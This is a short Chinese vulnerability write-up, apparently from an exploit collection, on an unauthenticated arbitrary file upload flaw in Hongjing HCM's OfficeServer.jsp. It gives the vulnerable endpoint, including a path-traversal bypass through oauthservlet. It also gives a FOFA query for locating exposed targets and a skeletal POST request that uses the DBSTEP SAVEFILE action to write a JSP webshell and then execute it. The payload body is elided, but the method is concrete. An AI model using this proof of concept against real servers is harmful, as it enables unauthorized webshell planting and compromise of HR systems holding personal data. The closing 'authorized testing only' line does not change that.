---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 宏景HCM OfficeServer.jsp 任意文件上传漏洞

## 漏洞描述

宏景HCM `/w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp` 接口存在 DBSTEP 协议任意文件上传漏洞。经 oauthservlet 目录穿越未授权访问，SAVEFILE 操作可写入 JSP 木马。

## 影响版本

```
宏景HCM eHR
```

## 网络测绘

```
app="HJSOFT-HCM"
```

## 漏洞复现

```
POST /w_selfservice/oauthservlet/%2e./.%2e/system/options/customreport/OfficeServer.jsp HTTP/1.1
Content-Type: multipart/form-data; boundary=----

DBSTEP ... SAVEFILE ... FILENAME=...jsp
```

利用 DBSTEP 协议的 SAVEFILE 动作将 JSP 写入 Web 目录后直接访问执行。

> 仅限授权测试。PoC 逻辑提取自 I-Wanna-Get-All 集成利用工具对应模块。
